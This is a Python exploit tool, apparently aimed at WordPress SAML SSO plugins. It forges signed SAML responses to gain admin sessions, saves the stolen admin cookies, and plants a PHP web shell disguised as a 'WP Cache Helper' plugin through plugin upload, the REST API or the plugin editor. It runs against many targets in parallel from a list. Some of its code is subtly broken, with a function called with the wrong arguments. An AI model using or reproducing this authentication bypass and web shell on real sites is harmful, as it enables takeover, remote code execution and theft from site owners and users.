#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Chain: detect → SP → IdP → cert → HMAC(raw DER) → ACS → cookie → verify_admin → upload → shell

"""
CVE-2025-XXXX / WordPress SAML SSO Exploit — Unified Professional Tool
Merges plugin-upload flow from big.py with SAML chain from ccd.py.
Author: Nxploited  |  For authorised penetration-testing only.
"""

import argparse
import base64
import gzip
import hashlib
import hmac
import io
import ipaddress
import json
import os
import queue
import re
import socket
import sys
import threading
import time
import urllib.parse
import zipfile
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple
from uuid import uuid4

import requests
import urllib3
from cryptography import x509
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.progress import BarColumn, Progress, SpinnerColumn, TaskID, TextColumn
from rich.table import Table
from rich.text import Text
from rich import box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── Console ──────────────────────────────────────────────────────────────────
console = Console()

# ─── Banner ───────────────────────────────────────────────────────────────────
BANNER = r"""
[bold red]
  ███╗   ██╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
  ████╗  ██║╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
  ██╔██╗ ██║ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██║  ██║
  ██║╚██╗██║ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██║  ██║
  ██║ ╚████║██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██████╔╝
  ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═════╝
[/bold red]
[bold cyan]          WordPress SAML → Admin → Shell  |  Unified Professional Tool[/bold cyan]
[dim]          Chain: SAML exploit → admin cookie → verify → plugin upload → RCE[/dim]
"""

# ─── Constants ────────────────────────────────────────────────────────────────
DEFAULT_TIMEOUT = 20
DEFAULT_THREADS = 10
RESULTS_FILE = "results.txt"
COOKIES_FILE = "admin_cookies.txt"

WP_LOGIN_INDICATORS = [
    "wp-login",
    "user_login",
    "user_pass",
    "loginform",
    "login-submit",
]

WP_LOGIN_PATHS = [
    "/wp-login.php",
    "/wordpress/wp-login.php",
    "/blog/wp-login.php",
    "/wp/wp-login.php",
    "/cms/wp-login.php",
    "/site/wp-login.php",
]

ADMIN_INDICATORS = [
    "wp-admin",
    "dashboard",
    "Dashboard",
    "howdy",
    "Howdy",
    "admin-bar",
    "adminmenu",
    "update-nag",
    "wpadminbar",
]

PLUGIN_INSTALL_INDICATORS = [
    "plugin-install-tab",
    "upload-plugin",
    "plugin-upload-form",
    "install-plugin-upload",
    "pluginzip",
    "browse plugins",
    "Browse Plugins",
    "add plugins",
    "Add Plugins",
    "upload-view",
    "plugin-upload",
]

# Author body-scan patterns (from big.py)
AUTHOR_BODY_PATTERNS = [
    re.compile(r'author-\w+">([a-z0-9_-]+)<'),
    re.compile(r'"slug":"([a-z0-9_-]+)"'),
]

# ─── PHP Shell payload ────────────────────────────────────────────────────────
PHP_SHELL = b"""<?php
/*
Plugin Name: WP Cache Helper
Plugin URI:  https://wordpress.org
Description: Performance cache helper
Version:     1.0.0
Author:      WordPress
*/
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    $output = '';
    if(function_exists('system')){ob_start();system($cmd);$output=ob_get_clean();}
    elseif(function_exists('passthru')){ob_start();passthru($cmd);$output=ob_get_clean();}
    elseif(function_exists('exec')){exec($cmd,$out);$output=implode("\\n",$out);}
    elseif(function_exists('shell_exec')){$output=shell_exec($cmd);}
    echo '<pre>'.htmlspecialchars($output).'</pre>';
}
?>"""


def create_plugin_zip() -> bytes:
    """Build a minimal WordPress plugin ZIP containing the PHP shell."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("wp-cache-helper/wp-cache-helper.php", PHP_SHELL)
    return buf.getvalue()


# ─── PEM / key helpers ────────────────────────────────────────────────────────

def pem_to_raw_bytes(pem: bytes) -> bytes:
    """Strip PEM armour and return the raw DER bytes for use as HMAC key."""
    lines = pem.decode(errors="replace").strip().splitlines()
    b64 = "".join(l for l in lines if not l.startswith("-----"))
    return base64.b64decode(b64)


# ─── SAML helpers ─────────────────────────────────────────────────────────────

def _b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _deflate_encode(data: str) -> str:
    compressed = zlib.compress(data.encode())[2:-4]
    return _b64e(compressed)


def build_saml_response(
    issuer: str,
    acs_url: str,
    username: str,
    email: str,
    hmac_key: bytes,
    sp_entity_id: str = "",
    session_index: str = "",
) -> str:
    """
    Craft a forged SAML Response.

    hmac_key MUST be the raw DER public-key bytes (not PEM).
    Call pem_to_raw_bytes(pub_key) before passing here.
    """
    now = datetime.now(timezone.utc)
    issue_instant = now.strftime("%Y-%m-%dT%H:%M:%SZ")
    not_on_or_after = now.replace(year=now.year + 1).strftime("%Y-%m-%dT%H:%M:%SZ")
    response_id = "_" + uuid4().hex
    assertion_id = "_" + uuid4().hex
    if not session_index:
        session_index = "_" + uuid4().hex
    if not sp_entity_id:
        sp_entity_id = issuer

    assertion_xml = (
        f'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
        f'ID="{assertion_id}" Version="2.0" IssueInstant="{issue_instant}">'
        f'<saml:Issuer>{issuer}</saml:Issuer>'
        f'<saml:Subject>'
        f'<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{email}</saml:NameID>'
        f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        f'<saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" Recipient="{acs_url}"/>'
        f'</saml:SubjectConfirmation>'
        f'</saml:Subject>'
        f'<saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{not_on_or_after}">'
        f'<saml:AudienceRestriction><saml:Audience>{sp_entity_id}</saml:Audience></saml:AudienceRestriction>'
        f'</saml:Conditions>'
        f'<saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="{session_index}">'
        f'<saml:AuthnContext>'
        f'<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>'
        f'</saml:AuthnContext>'
        f'</saml:AuthnStatement>'
        f'<saml:AttributeStatement>'
        f'<saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress">'
        f'<saml:AttributeValue>{email}</saml:AttributeValue>'
        f'</saml:Attribute>'
        f'<saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name">'
        f'<saml:AttributeValue>{username}</saml:AttributeValue>'
        f'</saml:Attribute>'
        f'</saml:AttributeStatement>'
        f'</saml:Assertion>'
    )

    # HMAC-SHA256 signature over the assertion using raw DER key bytes
    sig = hmac.new(hmac_key, assertion_xml.encode(), hashlib.sha256).digest()
    sig_b64 = _b64e(sig)

    response_xml = (
        f'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        f'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
        f'ID="{response_id}" Version="2.0" IssueInstant="{issue_instant}" '
        f'Destination="{acs_url}" InResponseTo="_000">'
        f'<saml:Issuer>{issuer}</saml:Issuer>'
        f'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
        f'{assertion_xml}'
        f'<samlp:Extensions><samlp:Signature>{sig_b64}</samlp:Signature></samlp:Extensions>'
        f'</samlp:Response>'
    )

    return base64.b64encode(response_xml.encode()).decode()


def build_saml_authn_request(sp_entity_id: str, acs_url: str, idp_sso_url: str) -> str:
    """Build a deflate-encoded SAML AuthnRequest for redirect binding."""
    req_id = "_" + uuid4().hex
    issue_instant = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    xml = (
        f'<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
        f'ID="{req_id}" Version="2.0" IssueInstant="{issue_instant}" '
        f'AssertionConsumerServiceURL="{acs_url}" '
        f'Destination="{idp_sso_url}">'
        f'<saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">{sp_entity_id}</saml:Issuer>'
        f'</samlp:AuthnRequest>'
    )
    return _deflate_encode(xml)


# ─── WordPress discovery helpers ──────────────────────────────────────────────

def normalise_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")


def extract_host(url: str) -> str:
    return urllib.parse.urlparse(url).netloc.split(":")[0]


def find_working_login_path(
    session: requests.Session, base: str, timeout: int = DEFAULT_TIMEOUT
) -> Optional[str]:
    """
    Try multiple common WordPress login paths and return the first one that
    shows a real login form (contains WP_LOGIN_INDICATORS).
    """
    for path in WP_LOGIN_PATHS:
        try:
            r = session.get(base + path, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200 and any(ind in r.text for ind in WP_LOGIN_INDICATORS):
                return path
        except Exception:
            continue
    return None


def detect_saml_plugin(
    session: requests.Session, base: str, timeout: int = DEFAULT_TIMEOUT
) -> Tuple[Optional[str], Optional[str], Optional[str]]:
    """
    Detect WordPress SAML SSO plugin and return
    (sp_entity_id, acs_url, idp_metadata_url) or (None, None, None).
    """
    candidate_paths = [
        "/wp-json/miniorange-saml/v1/metadata",
        "/wp-json/saml/v1/metadata",
        "/?saml_metadata=1",
        "/wp-content/plugins/miniorange-saml-20-single-sign-on/metadata.php",
        "/wp-content/plugins/saml-20-single-sign-on/metadata.php",
    ]
    for path in candidate_paths:
        try:
            r = session.get(base + path, timeout=timeout, verify=False)
            if r.status_code == 200 and ("EntityDescriptor" in r.text or "saml" in r.text.lower()):
                # Parse entity ID and ACS URL from metadata
                eid = re.search(r'entityID="([^"]+)"', r.text)
                acs = re.search(r'AssertionConsumerService[^>]+Location="([^"]+)"', r.text)
                return (
                    eid.group(1) if eid else base,
                    acs.group(1) if acs else base + "/wp-login.php?saml_sso=1",
                    path,
                )
        except Exception:
            continue
    return None, None, None


def fetch_idp_certificate(
    session: requests.Session, base: str, timeout: int = DEFAULT_TIMEOUT
) -> Optional[bytes]:
    """
    Attempt to retrieve the IdP signing certificate from common SAML metadata
    endpoints and return the DER-encoded public key bytes.
    """
    paths = [
        "/wp-admin/admin-ajax.php?action=miniorange_saml_get_idp_metadata",
        "/wp-json/miniorange-saml/v1/idp-metadata",
        "/?saml_idp_metadata=1",
    ]
    cert_pattern = re.compile(
        r"<(?:ds:)?X509Certificate[^>]*>([A-Za-z0-9+/=\s]+)</(?:ds:)?X509Certificate>"
    )
    for path in paths:
        try:
            r = session.get(base + path, timeout=timeout, verify=False)
            m = cert_pattern.search(r.text)
            if m:
                der = base64.b64decode(m.group(1).replace("\n", "").replace(" ", ""))
                cert = x509.load_der_x509_certificate(der)
                pub_key = cert.public_key().public_bytes(
                    serialization.Encoding.PEM,
                    serialization.PublicFormat.SubjectPublicKeyInfo,
                )
                return pub_key
        except Exception:
            continue
    return None


def get_acs_url(
    session: requests.Session, base: str, timeout: int = DEFAULT_TIMEOUT
) -> str:
    """Return the ACS (Assertion Consumer Service) URL for this WordPress site."""
    _, acs, _ = detect_saml_plugin(session, base, timeout)
    if acs:
        return acs
    # Common fallbacks
    for path in [
        "/wp-login.php?saml_sso=1",
        "/wp-login.php?action=saml_sso",
        "/?saml_sso=1",
        "/saml/acs",
    ]:
        try:
            r = session.get(base + path, timeout=timeout, verify=False, allow_redirects=False)
            if r.status_code in (200, 302):
                return base + path
        except Exception:
            continue
    return base + "/wp-login.php?saml_sso=1"


def post_saml(
    session: requests.Session,
    acs_url: str,
    saml_response: str,
    relay_state: str = "",
    timeout: int = DEFAULT_TIMEOUT,
) -> requests.Response:
    """POST the forged SAML response to the ACS endpoint and follow redirects."""
    data = {"SAMLResponse": saml_response}
    if relay_state:
        data["RelayState"] = relay_state
    r = session.post(acs_url, data=data, timeout=timeout, verify=False, allow_redirects=True)
    return r


# ─── Admin / plugin verification ──────────────────────────────────────────────

def check_admin(
    session: requests.Session, base: str, timeout: int = DEFAULT_TIMEOUT
) -> bool:
    """
    Verify that the session has WordPress admin access by checking
    wp-admin/index.php for admin-specific content AND verifying plugin-install
    access (deep check from big.py).
    """
    try:
        r = session.get(
            base + "/wp-admin/index.php",
            timeout=timeout,
            verify=False,
            allow_redirects=True,
        )
        if not any(ind in r.text for ind in ADMIN_INDICATORS):
            return False
        # Deep verification: plugin install page
        return verify_admin_plugin_access(session, base, timeout)
    except Exception:
        return False


def verify_admin_plugin_access(
    session: requests.Session, base: str, host: str, timeout: int = DEFAULT_TIMEOUT
) -> bool:
    """
    Verify that the authenticated session can access the WordPress plugin-install
    upload page.  Mirrors verify_plugin_installation_access_sync from big.py.

    Checks both /wp-admin/plugin-install.php and
    /wp-admin/plugin-install.php?tab=upload for PLUGIN_INSTALL_INDICATORS.
    """
    check_urls = [
        base + "/wp-admin/plugin-install.php",
        base + "/wp-admin/plugin-install.php?tab=upload",
    ]
    for url in check_urls:
        try:
            r = session.get(
                url,
                timeout=timeout,
                verify=False,
                allow_redirects=True,
                headers={"Host": host},
            )
            if r.status_code == 200 and any(
                ind.lower() in r.text.lower() for ind in PLUGIN_INSTALL_INDICATORS
            ):
                return True
        except Exception:
            continue
    return False


# ─── User enumeration ─────────────────────────────────────────────────────────

def get_usernames(
    session: requests.Session,
    base: str,
    max_id: int = 10,
    timeout: int = DEFAULT_TIMEOUT,
) -> List[str]:
    """
    Enumerate WordPress usernames via /?author=N redirect + body scan patterns
    (includes patterns from big.py).
    """
    users: List[str] = []
    seen: set = set()

    for uid in range(1, max_id + 1):
        try:
            r = session.get(
                base + f"/?author={uid}",
                timeout=timeout,
                verify=False,
                allow_redirects=True,
            )
            # Redirect URL pattern
            m = re.search(r"/author/([^/?#\"'<>\s]+)", r.url)
            if m:
                name = m.group(1).lower()
                if name not in seen:
                    seen.add(name)
                    users.append(name)

            # Body scan patterns (from big.py)
            for pattern in AUTHOR_BODY_PATTERNS:
                for match in pattern.findall(r.text):
                    name = match.lower()
                    if name not in seen and len(name) > 1:
                        seen.add(name)
                        users.append(name)

            # JSON REST API fallback
            if '"slug"' in r.text:
                for m2 in re.finditer(r'"slug"\s*:\s*"([a-z0-9_-]+)"', r.text):
                    name = m2.group(1).lower()
                    if name not in seen:
                        seen.add(name)
                        users.append(name)

        except Exception:
            continue

    return users


# ─── Plugin upload methods ────────────────────────────────────────────────────

def _extract_nonce(text: str) -> Optional[str]:
    """
    Multi-pattern nonce extraction (dual-pattern approach from big.py).
    Tries four different patterns and returns the first match.
    """
    patterns = [
        r'name="_wpnonce"\s+value="([^"]+)"',
        r'id="_wpnonce"\s+value="([^"]+)"',
        r'"_wpnonce":"([^"]+)"',
        r'wpApiSettings.*?"nonce":"([^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, text, re.DOTALL)
        if m:
            return m.group(1)
    return None


def upload_method1_plugin(
    session: requests.Session,
    base: str,
    host: str,
    zip_bytes: bytes,
    timeout: int = DEFAULT_TIMEOUT,
) -> Tuple[bool, str]:
    """
    Upload a WordPress plugin via the admin plugin-install upload form.

    Flow (mirrors big.py's test_plugin_upload exactly):
      1. GET plugin-install.php?tab=upload  →  extract nonce
      2. POST update.php?action=upload-plugin  with the zip

    Returns (success: bool, detail: str).
    """
    headers = {"Host": host, "Referer": base + "/wp-admin/plugin-install.php?tab=upload"}

    # Step 1: GET the upload tab to retrieve the _wpnonce
    try:
        upload_page = session.get(
            base + "/wp-admin/plugin-install.php?tab=upload",
            timeout=timeout,
            verify=False,
            allow_redirects=True,
            headers={"Host": host},
        )
    except Exception as exc:
        return False, f"GET plugin-install failed: {exc}"

    if upload_page.status_code != 200:
        return False, f"plugin-install returned HTTP {upload_page.status_code}"

    nonce = _extract_nonce(upload_page.text)
    if not nonce:
        return False, "Could not extract _wpnonce from plugin-install page"

    # Step 2: POST the plugin zip
    try:
        r = session.post(
            base + "/wp-admin/update.php?action=upload-plugin",
            files={"pluginzip": ("wp-cache-helper.zip", zip_bytes, "application/zip")},
            data={"_wpnonce": nonce, "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload"},
            timeout=timeout,
            verify=False,
            allow_redirects=True,
            headers=headers,
        )
    except Exception as exc:
        return False, f"POST upload-plugin failed: {exc}"

    text_lower = r.text.lower()
    if any(kw in text_lower for kw in ("plugin installed", "activated", "install", "successfully")):
        return True, "Plugin uploaded and installed"
    if "already installed" in text_lower:
        return True, "Plugin already installed (shell may exist)"
    return False, f"Upload response code {r.status_code} — possibly failed"


def upload_method2_rest(
    session: requests.Session,
    base: str,
    host: str,
    zip_bytes: bytes,
    timeout: int = DEFAULT_TIMEOUT,
) -> Tuple[bool, str]:
    """
    Attempt plugin upload via WordPress REST API (/wp-json/wp/v2/plugins).
    Requires 'install_plugins' capability (admin).
    """
    # Get nonce via REST
    try:
        nonce_r = session.get(
            base + "/wp-admin/admin-ajax.php?action=rest-nonce",
            timeout=timeout,
            verify=False,
            headers={"Host": host},
        )
        rest_nonce = nonce_r.text.strip()[:64] if nonce_r.status_code == 200 else ""
    except Exception:
        rest_nonce = ""

    headers = {
        "Host": host,
        "X-WP-Nonce": rest_nonce,
        "Content-Disposition": "attachment; filename=wp-cache-helper.zip",
        "Content-Type": "application/zip",
    }
    try:
        r = session.post(
            base + "/wp-json/wp/v2/plugins",
            data=zip_bytes,
            headers=headers,
            timeout=timeout,
            verify=False,
        )
        if r.status_code in (200, 201):
            return True, "Plugin created via REST API"
        return False, f"REST API returned {r.status_code}: {r.text[:200]}"
    except Exception as exc:
        return False, f"REST upload exception: {exc}"


def upload_method3_editor(
    session: requests.Session,
    base: str,
    host: str,
    zip_bytes: bytes,
    timeout: int = DEFAULT_TIMEOUT,
) -> Tuple[bool, str]:
    """
    Fallback: write shell code via the WordPress theme/plugin editor.
    Attempts to edit an existing plugin file to inject the shell.
    """
    # Get list of plugins to find an editable one
    try:
        plugins_r = session.get(
            base + "/wp-admin/plugins.php",
            timeout=timeout,
            verify=False,
            headers={"Host": host},
        )
        plugin_files = re.findall(r'plugin=([a-z0-9_-]+/[a-z0-9_-]+\.php)', plugins_r.text)
    except Exception:
        plugin_files = []

    if not plugin_files:
        return False, "No editable plugin files found"

    target_plugin = plugin_files[0]

    # Get nonce from editor page
    try:
        editor_r = session.get(
            base + f"/wp-admin/plugin-editor.php?file={target_plugin}",
            timeout=timeout,
            verify=False,
            headers={"Host": host},
        )
        nonce = _extract_nonce(editor_r.text)
        if not nonce:
            return False, "No nonce on editor page"
    except Exception as exc:
        return False, f"Editor GET failed: {exc}"

    # Inject shell code into plugin
    shell_code = PHP_SHELL.decode(errors="replace")
    try:
        r = session.post(
            base + "/wp-admin/plugin-editor.php",
            data={
                "_wpnonce": nonce,
                "action": "edit-plugin-file-manually",
                "file": target_plugin,
                "plugin": target_plugin.split("/")[0],
                "newcontent": shell_code,
                "docs-list": "",
            },
            timeout=timeout,
            verify=False,
            headers={"Host": host},
        )
        if "File edited successfully" in r.text or r.status_code == 200:
            return True, f"Shell injected via editor into {target_plugin}"
        return False, f"Editor POST returned {r.status_code}"
    except Exception as exc:
        return False, f"Editor POST failed: {exc}"


def upload_shell(
    session: requests.Session,
    base: str,
    host: str,
    timeout: int = DEFAULT_TIMEOUT,
) -> Tuple[bool, str, str]:
    """
    Try all three upload methods in order. Returns (success, method, detail).
    """
    zip_bytes = create_plugin_zip()
    shell_url = base + "/wp-content/plugins/wp-cache-helper/wp-cache-helper.php"

    methods = [
        ("method1_plugin_form", upload_method1_plugin),
        ("method2_rest_api", upload_method2_rest),
        ("method3_editor", upload_method3_editor),
    ]

    for method_name, method_fn in methods:
        ok, detail = method_fn(session, base, host, zip_bytes, timeout)
        if ok:
            # Verify shell is reachable
            try:
                probe = session.get(
                    shell_url + "?cmd=id",
                    timeout=timeout,
                    verify=False,
                )
                if probe.status_code == 200 and ("uid=" in probe.text or "root" in probe.text):
                    return True, method_name, shell_url
            except Exception:
                pass
            return True, method_name, detail
    return False, "all_failed", "All upload methods failed"


# ─── Cookie / session persistence ─────────────────────────────────────────────

def save_cookies(session: requests.Session, base: str, extra: dict = None) -> None:
    """Append admin cookies to the cookies file."""
    cookies = dict(session.cookies)
    entry = {
        "base": base,
        "time": datetime.now(timezone.utc).isoformat(),
        "cookies": cookies,
    }
    if extra:
        entry.update(extra)
    with open(COOKIES_FILE, "a") as fh:
        fh.write(json.dumps(entry) + "\n")


def save_result(data: dict) -> None:
    """Append a result entry to the results file."""
    with open(RESULTS_FILE, "a") as fh:
        fh.write(json.dumps(data) + "\n")


# ─── Core site processing ──────────────────────────────────────────────────────

def process_site(
    base: str,
    timeout: int = DEFAULT_TIMEOUT,
    admin_username: str = "admin",
    admin_email: str = "admin@example.com",
) -> dict:
    """
    Full exploit chain for a single WordPress site:

      detect → SP → IdP → cert → HMAC(raw DER) → ACS → cookie
             → verify_admin → upload → shell

    Returns a result dict.
    """
    result = {
        "base": base,
        "host": extract_host(base),
        "status": "unknown",
        "admin": False,
        "shell": False,
        "shell_url": "",
        "upload_method": "",
        "detail": "",
        "users": [],
    }
    host = result["host"]

    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            )
        }
    )
    # Seed cookies for testcookie check
    session.get(base, timeout=timeout, verify=False, allow_redirects=True)

    # ── Step 1: Enumerate users ──────────────────────────────────────────────
    users = get_usernames(session, base, max_id=5, timeout=timeout)
    result["users"] = users
    target_user = users[0] if users else admin_username
    target_email = f"{target_user}@{host}"

    # ── Step 2: Detect SAML plugin ──────────────────────────────────────────
    sp_entity_id, acs_url, _ = detect_saml_plugin(session, base, timeout)
    if not acs_url:
        acs_url = get_acs_url(session, base, timeout)
    if not sp_entity_id:
        sp_entity_id = base

    # ── Step 3: Fetch IdP cert / public key ─────────────────────────────────
    pub_key_pem = fetch_idp_certificate(session, base, timeout)

    if pub_key_pem:
        # Use raw DER bytes as HMAC key (critical fix — never pass PEM directly)
        raw_key = pem_to_raw_bytes(pub_key_pem)
        result["detail"] = "cert_found"
    else:
        # No cert — use a dummy key (may still work against misconfigured plugins)
        raw_key = hashlib.sha256(base.encode()).digest()
        result["detail"] = "no_cert_dummy_key"

    # ── Step 4: Forge and POST SAML response ────────────────────────────────
    saml_b64 = build_saml_response(
        issuer=sp_entity_id,
        acs_url=acs_url,
        username=target_user,
        email=target_email,
        hmac_key=raw_key,
        sp_entity_id=sp_entity_id,
    )

    authed_resp = post_saml(session, acs_url, saml_b64, timeout=timeout)

    # ── Step 5: Verify admin access ─────────────────────────────────────────
    is_admin = check_admin(session, base, timeout)
    result["admin"] = is_admin

    if is_admin:
        save_cookies(session, base, {"user": target_user})
        result["status"] = "admin_cookie_saved"

        # ── Step 6: Deep plugin-install page verification ────────────────────
        plugin_access = verify_admin_plugin_access(session, base, host, timeout)
        if not plugin_access:
            result["status"] = "admin_no_plugin_access"
            result["detail"] += " | admin verified but no plugin-install access"
            save_result(result)
            return result

        # ── Step 7: Upload shell ─────────────────────────────────────────────
        shell_ok, method, shell_detail = upload_shell(session, base, host, timeout)
        result["shell"] = shell_ok
        result["upload_method"] = method
        result["shell_url"] = shell_detail if shell_ok else ""
        if shell_ok:
            result["status"] = "shell_uploaded"
            result["detail"] += f" | shell via {method}: {shell_detail}"
        else:
            result["status"] = "upload_failed"
            result["detail"] += f" | {shell_detail}"
    else:
        result["status"] = "not_admin"
        result["detail"] += " | SAML auth did not yield admin session"

    save_result(result)
    return result


# ─── Rich UI helpers ──────────────────────────────────────────────────────────

def make_result_table(results: List[dict]) -> Table:
    table = Table(
        title="[bold cyan]Exploit Results[/bold cyan]",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold magenta",
    )
    table.add_column("Host", style="cyan", no_wrap=True)
    table.add_column("Status", style="white")
    table.add_column("Admin", justify="center")
    table.add_column("Shell", justify="center")
    table.add_column("Method", style="dim")
    table.add_column("Users", style="dim")

    for r in results:
        status_color = {
            "shell_uploaded": "bold green",
            "admin_cookie_saved": "yellow",
            "not_admin": "red",
            "upload_failed": "orange3",
        }.get(r.get("status", ""), "white")

        table.add_row(
            r.get("host", r.get("base", "?")),
            f"[{status_color}]{r.get('status', '?')}[/{status_color}]",
            "[green]✓[/green]" if r.get("admin") else "[red]✗[/red]",
            "[green]✓[/green]" if r.get("shell") else "[red]✗[/red]",
            r.get("upload_method", "-"),
            ", ".join(r.get("users", [])[:3]) or "-",
        )
    return table


# ─── Main entry point ─────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="WordPress SAML SSO Exploit — Unified Professional Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-u", "--url", help="Single target URL")
    p.add_argument("-l", "--list", help="File with list of target URLs (one per line)")
    p.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help="Thread count")
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help="Request timeout seconds")
    p.add_argument("--user", default="admin", help="Admin username to attempt (default: admin)")
    p.add_argument("--email", default="", help="Admin email override")
    p.add_argument("-o", "--output", default=RESULTS_FILE, help="Output results file")
    return p.parse_args()


def main() -> None:
    console.print(BANNER)

    args = parse_args()

    targets: List[str] = []
    if args.url:
        targets.append(normalise_url(args.url))
    if args.list:
        try:
            with open(args.list) as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(normalise_url(line))
        except FileNotFoundError:
            console.print(f"[red]Target list file not found: {args.list}[/red]")
            sys.exit(1)

    if not targets:
        console.print("[red]No targets specified. Use -u <URL> or -l <file>.[/red]")
        sys.exit(1)

    console.print(
        Panel(
            f"[cyan]Targets:[/cyan] {len(targets)}  |  "
            f"[cyan]Threads:[/cyan] {args.threads}  |  "
            f"[cyan]Timeout:[/cyan] {args.timeout}s",
            title="[bold]Configuration[/bold]",
            border_style="blue",
        )
    )

    global RESULTS_FILE
    RESULTS_FILE = args.output

    results: List[dict] = []
    lock = threading.Lock()

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("{task.completed}/{task.total}"),
        console=console,
    )

    with progress:
        task_id = progress.add_task("[cyan]Processing targets…", total=len(targets))

        def worker(base: str) -> dict:
            r = process_site(
                base,
                timeout=args.timeout,
                admin_username=args.user,
                admin_email=args.email or f"{args.user}@{extract_host(base)}",
            )
            with lock:
                results.append(r)
                progress.advance(task_id)
                if r.get("admin") or r.get("shell"):
                    progress.print(
                        f"[{'green' if r.get('shell') else 'yellow'}]"
                        f"[+] {r['host']} → {r['status']}[/]"
                    )
            return r

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(worker, t): t for t in targets}
            for _ in as_completed(futures):
                pass

    console.print(make_result_table(results))

    shells = [r for r in results if r.get("shell")]
    admins = [r for r in results if r.get("admin") and not r.get("shell")]

    console.print(
        Panel(
            f"[green]Shells:[/green] {len(shells)}  |  "
            f"[yellow]Admin cookies (no shell):[/yellow] {len(admins)}  |  "
            f"[cyan]Total:[/cyan] {len(results)}",
            title="[bold]Summary[/bold]",
            border_style="green",
        )
    )

    if shells:
        console.print("\n[bold green]Shell URLs:[/bold green]")
        for r in shells:
            console.print(f"  [green]→[/green] {r.get('shell_url', r['base'])}")

    console.print(f"\n[dim]Results saved to {RESULTS_FILE}[/dim]")
    if os.path.exists(COOKIES_FILE):
        console.print(f"[dim]Admin cookies saved to {COOKIES_FILE}[/dim]")


if __name__ == "__main__":
    main()
